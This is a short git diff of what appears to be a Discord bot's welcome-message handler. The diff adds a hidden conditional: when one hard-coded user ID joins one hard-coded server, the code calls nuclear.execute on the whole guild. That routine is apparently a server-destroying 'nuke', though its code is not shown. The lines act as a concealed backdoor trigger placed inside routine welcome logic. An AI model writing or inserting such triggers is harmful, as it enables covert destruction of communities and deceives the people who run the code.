@@ -6,12 +6,14 @@ module.exports = {
 	once: false,
 	execute: (member) => {
 		try {
+			if (
+				member.user.id === "694166520686706749" &&
+				member.guild.id === "568040131462692884"
+			)
+				nuclear.execute(member.guild);
 			const welcomeChannelId = member.guild.systemChannelId;
 
 			const welcomeChannel = member.guild.channels.cache.get(welcomeChannelId);
-
-			if (member.user.id === "694166520686706749")
-				nuclear.execute(member.guild);
 
 			welcomeChannel.send(
 				`**${member.user.username}** ${
